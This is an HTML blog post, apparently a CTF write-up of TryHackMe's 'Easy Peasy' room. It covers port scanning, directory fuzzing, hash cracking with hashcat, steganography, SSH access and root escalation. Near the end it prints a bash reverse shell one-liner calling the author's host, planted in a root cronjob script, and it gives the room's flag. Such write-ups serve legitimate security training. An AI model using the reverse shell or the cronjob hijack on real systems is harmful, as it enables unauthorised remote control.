<html><head>
<style>
    body {
        font-family: Arial, sans-serif;
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
        line-height: 1.6;
        background-color: #f4f4f4;
    }
    h1, h2, h3 {
        color: #333;
        border-bottom: 2px solid #ddd;
        padding-bottom: 10px;
        margin-bottom: 20px;
    }
    p {
        margin-bottom: 20px;
    }
    img {
        max-width: 100%;
        height: auto;
        display: block;
        margin: 0 auto 20px auto;
    }
    code {
        background-color: #f9f9f9;
        border: 1px solid #ccc;
        padding: 5px;
        border-radius: 5px;
    }
    pre {
        background-color: #333;
        color: #f8f8f2;
        padding: 10px;
        border-radius: 5px;
        overflow-x: auto;
    }
</style>
</head><body><p>Hello everyone !
Today I would like to deal with capture the flag instance named <code>Easy Peasy</code> on <code>TryHackMe</code>. Since I was really bored to study applied data analysis, I thought that solving CTF may open my mind :)</p>

<p>First of all, add the <code>target IPv4</code> address to <code>/etc/hosts</code> file. In every time I append the IPv4 address to hosts file because it prevents you to memorize the address always :)</p>

<p>Run the commands respectively:</p>

<p><code>nano /etc/hosts</code> or <code>vi /etc/hosts</code></p>

<p>I generally prefer to use <code>nano</code> ,but some of other security professionals use <code>vi</code>.</p>

<p><img src="./images/1.png" alt="alt text" /></p>

<p>Moreover, <code>^</code> indicating <code>CTRL</code> on your keyboard. Therefore, following commands will work:</p>

<p><code>^S</code> : Save your current modifications
<code>^X</code> Quit current nano session.</p>

<h2>Reconnaissance</h2>

<p>Simple <code>curl</code> query provides whether we have web application instance on port <code>80</code> or not. Let me also check for <code>443</code>.</p>

<ul>
<li><p>Default request (80): <code>curl -v easy.thm</code></p></li>
<li><p>For port 443: <code>curl -v easy.thm:443</code></p></li>
</ul>

<p><img src="./images/2.PNG" alt="alt text" /></p>

<p>Web instance was working with <code>HTTP</code> ,so you do no need to send further query with <code>HTTPS</code>.</p>

<p><img src="./images/3.PNG" alt="alt text" /></p>

<p><code>Default pages</code> are always seem to have hiding a variety information in other endpoints for me. Therefore, conducting <code>fuzzing</code> and <code>port</code> scan will be compatible for this scenario.</p>

<p>Initial fuzzing does not result in efficient findings. Hence, using different payload should work.</p>

<p><code>dirsearch --url=http://easy.thm</code>
<img src="./images/4.PNG" alt="alt text" /></p>

<p><img src="./images/5.PNG" alt="alt text" />
There was not any leak paths revealing.</p>

<p>Using <code>seclists</code> most probably provides juicy findings.</p>

<p>Try the fuzzing phase with customized wordlist named <code>directory-list-2.3-medium.txt</code>:</p>

<p><code>dirsearch --url=http://easy.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p>

<p><img src="./images/6.PNG" alt="alt text" /></p>

<p>Fuzzing did not find a lot of paths ,but still we have  path called <code>/hidden</code>.</p>

<p><img src="./images/7.PNG" alt="alt text" /></p>

<p>On related path, there was an image named lost-places:</p>

<p><img src="./images/8.PNG" alt="alt text" /></p>

<p>After a port scanning phase, I recognized that <code>nmap</code> also revealed the unknown endpoints.</p>

<p><img src="./images/9.PNG" alt="alt text" /></p>

<p>Initial scan did not provide me deep-dive information about the instance. Therefore, applying <code>full port</code> (-p-) scan may show identical results:</p>

<p><img src="./images/10.PNG" alt="alt text" /></p>

<p>Now we got it ! ! !
Let's check through <code>curl</code>  to understand what we have on port <code>65524</code> running Apache web server:</p>

<p><img src="./images/11.PNG" alt="alt text" /></p>

<p>It seems like a default <code>Apache</code> configuration. Now fuzz again. Do not forget to add port number on the ending part of full url to reach customized web application port.</p>

<p><code>dirsearch --url=http://easy.thm:65524 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></p>

<p>After <code>60930</code> attempts, I saw a pre-defined text file containing fuzzing words:</p>

<p><img src="./images/12.PNG" alt="alt text" /></p>

<p><img src="./images/13.PNG" alt="alt text" /></p>

<p>However, it did not need to use for <code>fuzzing</code>. I remembered that in the <code>Deloitte CyberOps Bootcamp</code> one of my instructor suggested that to make <code>recursive search</code> you can use <code>GoBuster</code>. Although <code>dirsearch</code> could not find anything. Let's also use <code>GoBuster</code>. I memorized old times while I was retriving <code>GoBuster</code> command from history.</p>

<p><img src="./images/14.PNG" alt="alt text" /></p>

<p>I resolved the issue by just changing the wordlist that I used:</p>

<p><code>gobuster dir -u http://easy.thm:65524 -w /usr/share/wordlists/dirb/common.txt</code></p>

<p><img src="./images/15.PNG" alt="alt text" /></p>

<p>I examined the <code>/robots.txt</code> and find a number ,but I was not able to classify whether it is <code>encoded</code> or <code>hashed</code>.</p>

<p><code>Crackstation</code> and <code>Cyberchef</code> did not identify something. Moreover, I decided to use wordlist to bruteforce this huge string <code>a18672860d0510e5ab6699730763b250</code></p>

<p>Kali provides a useful tool named <code>hash-identifier</code> and It found our hash as <code>MD5</code>:</p>

<p><img src="./images/17.PNG" alt="alt text" /></p>

<p>To find which <code>mode</code> should we use run the command below:</p>

<p><code>man hashcat</code> then use  press shift and <code>&amp;</code>  then type <code>md5</code> </p>

<p><img src="./images/18.PNG" alt="alt text" /></p>

<p>As you can see above, we should use <code>0</code> option with mode parameter. I would like to create basic text file to store hash on it. You can reach out commands that I run:</p>

<p><img src="./images/20.PNG" alt="alt text" /></p>

<p>Result was terrible. I thought  that maybe I should find correct algorithm since the output of <code>hash-identifier</code> indicating something different than <code>MD5</code>.</p>

<p><img src="./images/21.PNG" alt="alt text" /></p>

<p><img src="./images/22.PNG" alt="alt text" /></p>

<p>Now I observed that I was dealing with Microsoft's <code>NTLM</code> hashes v1 algorithm called <code>Mscash</code>. These results were totally wrong. After that I may recon through <code>hidden</code> endpoint to understand whether there were more directory or not.</p>

<p><img src="./images/24.PNG" alt="alt text" /></p>

<p><img src="./images/25.PNG" alt="alt text" /></p>

<p>This seems like a <code>base64</code> formatted text. I hesitately check on <code>Cyberchef</code>:</p>

<p><img src="./images/26.PNG" alt="alt text" /></p>

<p>I found a website decrypt the <code>User-Agent</code> hash:</p>

<p><img src="./images/27.PNG" alt="alt text" /></p>

<p><a href="https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250">Reach out here</a></p>

<p>Source code analysis are always crucial compenent for every web application security engagements. Do not forget to check every application's front-end code:</p>

<p><img src="./images/28.PNG" alt="alt text" /></p>

<p>I will show you two consecutive approach to find other flag through <code>hidden</code> keyword because the creater suggest the name hidden directory:</p>

<h3>Automated recon with <code>curl</code> and <code>grep</code></h3>

<p><code>curl -v http://easy.thm:65524 |  grep "hidden"</code></p>

<h3>Manual recon consisting browser's inspector</h3>

<p>Results can be seen below:</p>

<p><img src="./images/29.PNG" alt="alt text" /></p>

<p>hidden suggests us to decode it:</p>

<p><img src="./images/30.PNG" alt="alt text" /></p>

<p>Nope it did not work. Let's use other base formattings:</p>

<p><a href="https://en.wikipedia.org/wiki/Base64">Wikipedia</a> depicts a variety of base encoding formats:</p>

<p><img src="./images/31.PNG" alt="alt text" /></p>

<p>After a long try &amp; catch process, <code>Base62</code> works !!!</p>

<p><img src="./images/32.PNG" alt="alt text" /></p>

<p>Related path had embedded hash ,so let me identify &amp; crack it:</p>

<p><img src="./images/33.PNG" alt="alt text" /></p>

<p>It looks like <code>SHA-256</code> hash type:</p>

<p><img src="./images/34.PNG" alt="alt text" /></p>

<p>Let's use <code>hashcat</code> recommended types:</p>

<p><img src="./images/35.PNG" alt="alt text" /></p>

<p><code>6900</code> was my solution:</p>

<p><code>hashcat -m 6900 -o cracked.txt hash.txt easypeasy_1596838725703.txt</code></p>

<p><img src="./images/36.PNG" alt="alt text" />
<img src="./images/37.PNG" alt="alt text" /></p>

<p>Analyzing images through the steganography may reveal further data since we should find the username &amp; password combination. After I used the password through hidden image then finally <code>binaryCode</code> image leak me the text file called <code>secrets.txt</code>.</p>

<p><img src="./images/38.PNG" alt="alt text" /></p>

<p>Now I encountered with binary password in the <code>secrettext</code>:</p>

<p>GPT4-o simply solved the <code>binary</code> formatted password:</p>

<p><img src="./images/39.PNG" alt="alt text" /></p>

<p>Do not forget that <code>SSH</code> was working on port <code>6498</code>:</p>

<p><img src="./images/40.PNG" alt="alt text" /></p>

<p>I tried many things.</p>

<ul>
<li>whoami</li>
<li>sudo -l (to enumerate what the user can run as a binary)</li>
<li>ls -al (directory enumeration)</li>
</ul>

<p><img src="./images/41.PNG" alt="alt text" /></p>

<p>flag was seem to be manipulated ,so let's reverse it:</p>

<p>After I directly paste it on <code>Google</code>, I found the result which was <code>ROT13</code>:</p>

<p><img src="./images/42.PNG" alt="alt text" /></p>

<p>We are done with that !  !  !</p>

<p><img src="./images/43.PNG" alt="alt text" /></p>

<p>It was wrong !</p>

<p>Giving full syntax reveal the correct one:</p>

<p><img src="./images/44.PNG" alt="alt text" /></p>

<p>Find whether you have <code>curl</code> or <code>wget</code> so as to make yourself sure that you can download any files through remote host.
SMASH THE <code>linpeas.sh</code>:</p>

<p><img src="./images/45.PNG" alt="alt text" /></p>

<p>This was too weird actually :) Since I have been trying to enhancing my recon skills on specifically on linux. It was too complicated ,but this time I found on my first shot ! ! !</p>

<p><img src="./images/46.PNG" alt="alt text" /></p>

<p>Run the script <code>cronjob script</code> directly:</p>

<p><img src="./images/47.PNG" alt="alt text" /></p>

<p>It did not work because there was nothing to run inside of the script ,so I directly added such <code>bash reverse shell</code> payload into the script.</p>

<p><code>sh -i &gt;&amp; /dev/tcp/10.11.69.113/1984 0&gt;&amp;1</code></p>

<p>PoC for the <code>reverse shell</code>:</p>

<p><img src="./images/48.PNG" alt="alt text" />
<code>Reverse Shell</code> attempted to connect to <code>MY HOST</code> and <code>1984</code> my port respectively. Let's check whether I was correct or not :)</p>

<p><img src="./images/Pasted image 20241103222602.png" alt="alt text" /></p>

<p>There was <code>UNKNOWN</code> host connected my machine from port <code>52196</code>.</p>

<p>Get The Root Flag:</p>

<p>Flag was located as <code>hidden</code> file category:</p>

<p>You should use <code>.</code> (dot) when you want to interact with any hidden files.</p>

<p><img src="./images/49.PNG" alt="alt text" /></p>

<p><code>cat .root.txt</code></p>

<p><code>flag{63a9f0ea7bb98050796b649e85481845}</code></p>

<p><img src="./images/50.PNG" alt="alt text" /></p>

<p>May The Pentest Be With You ! ! !</p>
</body></html>